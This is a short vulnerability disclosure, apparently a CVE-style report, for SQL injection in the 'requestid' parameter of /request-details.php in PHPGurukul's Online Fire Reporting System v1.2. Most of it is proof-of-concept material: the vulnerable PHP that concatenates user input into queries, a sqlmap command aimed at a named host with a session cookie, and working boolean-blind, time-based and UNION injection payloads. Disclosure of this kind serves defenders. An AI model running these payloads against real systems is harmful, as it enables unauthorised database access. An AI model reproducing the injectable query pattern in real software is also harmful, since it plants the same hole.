# SQLi vulnerability in Online Fire Reporting System v1.2 of file /request-details.php

**Vender**

- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Version**

- V1.2

**Vulnerable File**

- /request-details.php

**Affect Param**

- requestid

### POC

```php
$rid=$_GET['requestid'];
$query=mysqli_query($con,"select * from tblfirereport where id='$rid'");
$query=mysqli_query($con,"select * from tblfirereport join tblteams on tblteams.id=tblfirereport.assignTo where tblfirereport.id='$rid'");
$ret=mysqli_query($con,"select * from tblfiretequesthistory where requestId='$rid'");
```



```bash
sqlmap -u http://www.firereport.top/admin/request-details.php?requestid=1 --cookie="PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf" --batch
```



```
---
Parameter: requestid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: requestid=1' AND 8124=8124 AND 'SNss'='SNss

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: requestid=1' AND (SELECT 2728 FROM (SELECT(SLEEP(5)))AnQf) AND 'nAaO'='nAaO

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: requestid=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71787a6271,0x45506642584c684246695942424d486c57596554545375484b5a764767496b63666449506b4c6956,0x7171717171),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```



![image-20250531182947043](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311829163.png)

